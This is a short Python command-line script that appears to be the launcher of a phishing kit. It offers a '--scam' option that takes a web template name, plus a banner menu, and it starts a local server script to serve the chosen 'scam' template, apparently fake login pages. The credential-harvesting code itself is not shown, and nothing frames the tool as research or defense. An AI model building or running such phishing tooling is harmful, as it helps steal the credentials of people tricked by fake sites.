import click
import subprocess
from scripts import props

@click.command()
@click.option("--scam"    , '-s', default="None" , 
                help="Web template name.   \033[92mpython my_soup.py -s Name\033[0m")
@click.option("--password", '-p', default=False,  
                help="View action history. \033[92mpython my_soup.py -p True\033[0m")
@click.option("--info",     '-i', default=False,
                help="View info tools.     \033[92mpython my_soup.py -i True\033[0m")

def main(scam, password, info):
    if (scam != "None"):
        print(f"Scam!! {scam}")
    elif (password):
        print("En construcción")
    elif (info):
        props.info()
    else:
        option = props.banner()
        if(option != None and option != 'Help'):
            subprocess.call(['python3', './scripts/server.py', '--scam', option])

if __name__ == "__main__":
    main()